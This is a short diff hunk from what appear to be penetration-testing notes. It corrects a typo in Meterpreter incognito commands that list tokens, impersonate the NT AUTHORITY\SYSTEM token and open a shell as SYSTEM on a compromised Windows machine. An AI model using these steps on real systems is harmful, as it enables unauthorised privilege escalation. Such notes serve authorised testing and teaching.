@@ -99,7 +99,7 @@ load incognito
 list_tokens -u 
 
 // we have impersonate tokens (for system)
-imporsonate_token "NT AUTHORITY\SYSTEM"
+impersonate_token "NT AUTHORITY\SYSTEM"
 shell 
 
 // now we are system user 
